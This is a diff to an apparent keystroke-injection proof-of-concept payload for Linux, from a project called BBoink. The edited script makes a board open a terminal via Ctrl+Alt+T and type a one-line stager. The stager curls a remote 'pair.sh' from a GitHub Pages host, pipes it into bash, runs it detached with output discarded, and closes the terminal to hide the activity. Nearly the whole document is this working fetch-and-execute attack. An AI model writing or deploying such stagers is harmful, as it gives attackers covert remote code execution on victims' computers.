@@ -1,9 +1,10 @@
-# BBoink PoC pairing payload (Linux). Focus a TERMINAL, then trigger: the board
-# types this one line, which fetches the hosted pairing helper and runs it
-# DETACHED (nohup + disown, output discarded) then closes the terminal (exit).
+# BBoink PoC pairing payload (Linux / Ubuntu-GNOME). Opens a terminal (Ctrl+Alt+T),
+# then types the stager: fetch the hosted pairing helper and run it DETACHED
+# (nohup + disown, output discarded), then close the terminal (exit).
 # {MAC} is substituted at runtime with THIS board's own BLE address.
 #
-# Format: GUI [key] | STRING <text> | ENTER | DELAY <ms> | # comment
-DELAY 300
+# Format: GUI [key] | CTRLALT <key> | STRING <text> | ENTER | DELAY <ms> | # comment
+CTRLALT t
+DELAY 1500
 STRING nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s {MAC}' >/dev/null 2>&1 & disown; exit
 ENTER
